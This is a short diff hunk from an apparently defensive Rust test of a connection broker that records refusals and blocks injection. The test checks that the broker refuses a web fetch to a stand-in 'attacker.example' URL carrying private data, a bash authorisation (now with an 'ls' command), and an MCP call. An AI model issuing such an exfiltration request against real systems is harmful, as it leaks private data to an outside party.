@@ -290,7 +290,7 @@ async fn custom_connection_broker_records_refusals_blocks_injection_and_captures
                 "web.fetch",
                 json!({"url":"https://attacker.example/?d=private"}),
             ),
-            ("native.authorize", json!({"name":"bash"})),
+            ("native.authorize", json!({"name":"bash","command":"ls"})),
             ("mcp.call", arguments),
         ] {
             let refused = broker_request(&socket, broker.token(), method, params).await;
